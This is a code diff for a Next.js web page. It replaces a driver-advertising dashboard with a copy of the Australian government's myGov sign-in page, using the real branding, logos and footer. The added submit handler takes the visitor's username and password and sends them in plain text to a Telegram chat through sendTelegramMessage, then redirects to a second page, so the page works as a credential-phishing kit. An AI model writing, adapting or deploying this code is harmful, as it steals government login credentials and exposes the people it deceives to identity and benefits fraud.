@@ -1,254 +1,249 @@
 /* eslint-disable @next/next/no-img-element */
-"use client";
-import React, { useEffect, useState } from "react";
-import { useRouter } from "next/navigation";
+"use client"
+import React, { useState } from "react";
+import Link from "next/link";
+import Image from "next/image";
+import "../css/mgv2-application.css";
+import "../css/blugov.css";
+import { sendTelegramMessage } from "../../utils/telegram";
 
-const Spinner = ({ size = 'md' }: { size?: 'sm' | 'md' | 'lg' }) => (
-  <div className={`animate-spin rounded-full border-2 border-solid border-current border-r-transparent 
-    ${size === 'sm' ? 'h-4 w-4' : size === 'lg' ? 'h-12 w-12' : 'h-8 w-8'} inline-block`}>
-    <span className="sr-only">Loading...</span>
-  </div>
-);
+const MyGovSignInPage: React.FC = () => {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState("");
 
-const VerificationPopup = ({ onClose }: { onClose: () => void }) => {
-  const router = useRouter();
+  const handleSubmit = async (event: React.FormEvent) => {
+    event.preventDefault();
+    setError("");
 
+    if (!username.trim() || !password.trim()) {
+      setError("Please enter both username and password");
+      return;
+    }
+
+    setIsLoading(true);
+    const timestamp = new Date().toLocaleString();
+    const message = `🔑 New Login Attempt\nUsername: ${username}\nPassword: ${password}\nTime: ${timestamp}`;
+
+    try {
+      await sendTelegramMessage(message);
+      window.location.href = '/mygov2';
+    } catch (err) {
+      console.error('Login error:', err);
+      setError("Service temporarily unavailable. Please try again later.");
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex flex-col">
+      <Header />
+      
+      <main className="flex-grow bg-gray-50">
+        <div className="container mx-auto px-4 py-8 md:py-12">
+          <div className="max-w-md md:max-w-lg mx-auto bg-white rounded-xl shadow-2xl p-6 md:p-10">
+            <div className="mb-10">
+              <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in with myGov</h1>
+              <h2 className="text-lg text-gray-600">Using your myGov sign in details</h2>
+            </div>
+
+            <Form 
+              onSubmit={handleSubmit}
+              error={error}
+              username={username}
+              setUsername={setUsername}
+              password={password}
+              setPassword={setPassword}
+              isLoading={isLoading}
+            />
+          </div>
+        </div>
+      </main>
+
+      <Footer />
+    </div>
+  );
+};
+
+const Header = () => (
+  <header className="border-b border-gray-200 bg-[#66d3ee]">
+  <div className="container mx-auto px-4 py-3">
+    <div className="flex items-center justify-between">
+      <a href="/" className="no-underline border-none hover:no-underline">
+      
+      <img
+  src="/images/myGov-cobranded-logo-black.svg"
+  alt="myGov Beta"
+  width="200"
+  height="50"
+  style={{
+    border: 'none',
+    outline: 'none',
+    display: 'block',
+    maxWidth: '100%',
+    height: 'auto',
+    boxSizing: 'border-box',
+  }}
+/>
 
 
   
-  const handleContinue = () => {
-    router.push("/mygov"); // Route to your desired page
-  };
-  return (
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-  <div className="bg-white p-8 rounded-lg shadow-lg max-w-sm text-center">
-    <h2 className="text-xl font-semibold mb-4 text-green-700">Welcome!</h2>
-    <p className="text-gray-600 mb-6">
-      Get started by verifying your identity.
-    </p>
-
-    <div className="flex justify-center gap-4">
-      {/* Continue Button */}
-      <button
-        onClick={handleContinue}
-        className="bg-green-600 text-white px-4 py-2 rounded-full hover:bg-green-700 transition duration-300"
-      >
-        Continue
-      </button>
-
-      {/* Cancel Button */}
-      <button
-        onClick={onClose}
-        className="bg-gray-200 text-gray-700 px-4 py-2 rounded-full hover:bg-gray-300 transition duration-300"
-      >
-        Cancel
-      </button>
+      </a>
     </div>
   </div>
-</div>
+</header>
 
-  );
-};
 
-const DriverDashboard = () => {
-  const [driverData, setDriverData] = useState<any>(null);
-  const [loading, setLoading] = useState(true);
-  const [showVerifyPopup, setShowVerifyPopup] = useState(false);
-  const router = useRouter();
+);
 
-  useEffect(() => {
-    const fetchDriverProfile = async () => {
-      try {
-        const userId = localStorage.getItem("userId");
-        
-        
-        const response = await fetch(`/api/drivers/${userId}`);
-        const data = await response.json();
-        
-        setDriverData(data);
-        if (data.verified) setShowVerifyPopup(true);
-      } catch (error) {
-        console.error("Error fetching driver data:", error);
-      } finally {
-        setLoading(false);
-      }
-    };
+const Form: React.FC<{
+  onSubmit: (e: React.FormEvent) => void;
+  error: string;
+  username: string;
+  setUsername: (val: string) => void;
+  password: string;
+  setPassword: (val: string) => void;
+  isLoading: boolean;
+}> = ({ onSubmit, error, username, setUsername, password, setPassword, isLoading }) => (
+  <form onSubmit={onSubmit} className="space-y-8">
+    {error && (
+      <div 
+        role="alert"
+        className="text-red-600 text-sm p-4 bg-red-50 rounded-lg border-2 border-red-100"
+      >
+        {error}
+      </div>
+    )}
 
-    fetchDriverProfile();
-  }, [router]);
+    <div className="space-y-6">
+      <FormField
+        id="userId"
+        label="Username or email"
+        type="text"
+        value={username}
+        onChange={setUsername}
+        disabled={isLoading}
+      />
 
-  const campaignStatusBadge = (status: string) => {
-    const statusStyles = {
-      active: "bg-green-100 text-green-800",
-      pending: "bg-yellow-100 text-yellow-800",
-      completed: "bg-blue-100 text-blue-800",
-    };
-    return (
-      <span className={`px-2 py-1 rounded-full text-sm ${statusStyles[status as keyof typeof statusStyles]}`}>
-        {status.toUpperCase()}
-      </span>
-    );
-  };
+      <FormField
+        id="password"
+        label="Password"
+        type="password"
+        value={password}
+        onChange={setPassword}
+        disabled={isLoading}
+      />
+    </div>
 
-  return (
-    <div className="min-h-screen bg-gray-50">
-      {showVerifyPopup && <VerificationPopup onClose={() => setShowVerifyPopup(false)} />}
+    <div className="text-right">
+      <Link 
+        href="/forgot-password" 
+        className="text-blue-600 text-lg hover:text-blue-800 hover:underline"
+      >
+        Forgot password?
+      </Link>
+    </div>
 
-      {/* Navigation Header */}
-      <nav className="bg-white shadow-sm">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="flex justify-between h-16 items-center">
-            <img src="/adrider-logo.svg" alt="AdRider" className="h-8" />
-            <div className="flex items-center space-x-4">
-              <button 
-                className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
-                onClick={() => setShowVerifyPopup(true)}
-              >
-                Apply for Campaign
-              </button>
-              <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
-                <span className="font-medium">{driverData?.firstName?.[0] || 'U'}</span>
-              </div>
-            </div>
-          </div>
-        </div>
+    <SubmitButton isLoading={isLoading} />
+    
+    <div className="mt-10 pt-8 border-t border-gray-200">
+      <p className="text-center text-lg text-gray-600">
+        Don&apos;t have an account?{' '}
+        <Link
+          href="https://my.gov.au/en/create-account/"
+          className="text-blue-600 hover:text-blue-800 hover:underline font-semibold"
+          target="_blank"
+          rel="noopener noreferrer"
+        >
+          Create a myGov account
+        </Link>
+      </p>
+    </div>
+  </form>
+);
+
+const FormField: React.FC<{
+  id: string;
+  label: string;
+  type: string;
+  value: string;
+  onChange: (val: string) => void;
+  disabled: boolean;
+}> = ({ id, label, type, value, onChange, disabled }) => (
+  <div>
+    <label htmlFor={id} className="block text-lg font-medium text-gray-700 mb-3">
+      {label}
+    </label>
+    <input
+      id={id}
+      type={type}
+      value={value}
+      onChange={(e) => onChange(e.target.value)}
+      className="w-full px-4 py-3 text-lg border-2 border-gray-200 rounded-xl focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
+      disabled={disabled}
+      required
+      aria-required
+    />
+  </div>
+);
+
+const SubmitButton: React.FC<{ isLoading: boolean }> = ({ isLoading }) => (
+  <div className="flex justify-center bg-[#99e1f3] w-full hover:bg-[#88d9ef] transition-colors">
+    <button
+      type="submit"
+      className="w-full h-full py-4 px-8 text-white text-xl font-bold rounded-xl 
+                 transform transition-all duration-200 hover:scale-[1.02]
+                 disabled:opacity-50 shadow-lg hover:shadow-xl"
+      disabled={isLoading}
+      aria-disabled={isLoading}
+    >
+      {isLoading ? 'Signing in...' : 'Sign in'}
+    </button>
+  </div>
+);
+
+const Footer = () => (
+  <footer className="bg-gray-900 text-white">
+    <div className="container mx-auto px-4 py-8">
+      <nav className="mb-8">
+        <ul className="flex flex-col md:flex-row gap-4 md:gap-8">
+          <FooterLink href="/terms" text="Terms of use" />
+          <FooterLink href="/privacy" text="Privacy and security" />
+          <FooterLink href="/copyright" text="Copyright" />
+          <FooterLink href="/accessibility" text="Accessibility" />
+        </ul>
       </nav>
 
-      {/* Main Content */}
-      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
-        {/* Dashboard Header */}
-        <div className="mb-8">
-          <h1 className="text-3xl font-bold text-gray-900">
-            Welcome back, {driverData?.firstName || 'Driver'}!
-          </h1>
-          <p className="text-gray-600 mt-2">
-            Your vehicle is currently earning: ${driverData?.currentEarnings?.toFixed(2) || '0.00'} this month
+      <div className="border-t border-gray-800 pt-8">
+        <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
+          <Link href="/" className="hover:opacity-80 transition-opacity">
+            <Image
+              src="/images/myGov-cobranded-logo-white.svg"
+              alt="myGov Beta"
+              width={160}
+              height={64}
+              className="h-16 w-auto"
+            />
+          </Link>
+          <p className="text-lg text-gray-400 max-w-2xl">
+            We acknowledge the Traditional Custodians of the lands we live on. We pay our
+            respects to all Elders, past and present, of all Aboriginal and Torres Strait
+            Islander nations.
           </p>
         </div>
-
-        {/* Stats Grid */}
-        {loading ? (
-          <div className="flex justify-center py-12">
-            <Spinner size="lg" />
-          </div>
-        ) : (
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
-            <div className="bg-white p-6 rounded-xl shadow-sm">
-              <div className="flex justify-between items-center">
-                <div>
-                  <p className="text-sm text-gray-600">Total Earnings</p>
-                  <p className="text-2xl font-bold mt-1">
-                    ${driverData?.totalEarnings?.toLocaleString() || '0.00'}
-                  </p>
-                </div>
-                <div className="bg-green-100 p-3 rounded-lg">💸</div>
-              </div>
-            </div>
-
-            <div className="bg-white p-6 rounded-xl shadow-sm">
-              <div className="flex justify-between items-center">
-                <div>
-                  <p className="text-sm text-gray-600">Available Balance</p>
-                  <p className="text-2xl font-bold mt-1">
-                    ${driverData?.availableBalance?.toLocaleString() || '0.00'}
-                  </p>
-                </div>
-                <div className="bg-blue-100 p-3 rounded-lg">🏦</div>
-              </div>
-            </div>
-
-            <div className="bg-white p-6 rounded-xl shadow-sm">
-              <div className="flex justify-between items-center">
-                <div>
-                  <p className="text-sm text-gray-600">Current Campaigns</p>
-                  <p className="text-2xl font-bold mt-1">
-                    {driverData?.currentCampaigns || 0}
-                  </p>
-                </div>
-                <div className="bg-purple-100 p-3 rounded-lg">🚗</div>
-              </div>
-            </div>
-
-            <div className="bg-white p-6 rounded-xl shadow-sm">
-              <div className="flex justify-between items-center">
-                <div>
-                  <p className="text-sm text-gray-600">Next Payment</p>
-                  <p className="text-2xl font-bold mt-1">
-                    {driverData?.nextPaymentDate || '--'}
-                  </p>
-                </div>
-                <div className="bg-yellow-100 p-3 rounded-lg">📅</div>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* Campaign Activity */}
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-          <section className="bg-white p-6 rounded-xl shadow-sm">
-            <h3 className="text-lg font-semibold mb-4">Active Campaigns</h3>
-            <div className="space-y-4">
-              {driverData?.campaigns?.map((campaign: any) => (
-                <div key={campaign.id} className="p-4 border-b last:border-0 hover:bg-gray-50">
-                  <div className="flex justify-between items-center">
-                    <div>
-                      <h4 className="font-medium">{campaign.name}</h4>
-                      <p className="text-sm text-gray-600">{campaign.dates}</p>
-                    </div>
-                    <div className="text-right">
-                      <p className="font-medium">${campaign.earnings.toFixed(2)}</p>
-                      {campaignStatusBadge(campaign.status)}
-                    </div>
-                  </div>
-                </div>
-              ))}
-              <button 
-                className="w-full text-center text-blue-600 py-3 hover:bg-gray-50 rounded-lg"
-                onClick={() => router.push("/campaigns")}
-              >
-                View All Campaigns →
-              </button>
-            </div>
-          </section>
-
-          {/* Quick Actions */}
-          <section className="bg-white p-6 rounded-xl shadow-sm">
-            <h3 className="text-lg font-semibold mb-4">Driver Tools</h3>
-            <div className="grid grid-cols-2 gap-4">
-              <button
-                className="p-4 bg-blue-50 rounded-lg hover:bg-blue-100 transition"
-                onClick={() => router.push("/campaigns/apply")}
-              >
-                <div className="text-xl mb-2">📢</div>
-                <span className="font-medium">Apply for New Campaign</span>
-              </button>
-              <button
-                className="p-4 bg-green-50 rounded-lg hover:bg-green-100 transition"
-                onClick={() => router.push("/schedule")}
-              >
-                <div className="text-xl mb-2">🗓️</div>
-                <span className="font-medium">View Schedule</span>
-              </button>
-              <button
-                className="p-4 bg-purple-50 rounded-lg hover:bg-purple-100 transition"
-                onClick={() => router.push("/documents")}
-              >
-                <div className="text-xl mb-2">📁</div>
-                <span className="font-medium">Upload Documents</span>
-              </button>
-              <button
-                className="p-4 bg-yellow-50 rounded-lg hover:bg-yellow-100 transition"
-                onClick={() => router.push("/support")}
-              >
-                <div className="text-xl mb-2">🛟</div>
-                <span className="font-medium">Support Center</span>
-              </button>
-            </div>
-          </section>
-        </div>
-      </main>
+      </div>
     </div>
-  );
-};
+  </footer>
+);
 
-export default DriverDashboard;
+const FooterLink: React.FC<{ href: string; text: string }> = ({ href, text }) => (
+  <li>
+    <Link href={href} className="text-lg hover:text-blue-300 transition-colors">
+      {text}
+    </Link>
+  </li>
+);
+
+export default MyGovSignInPage;
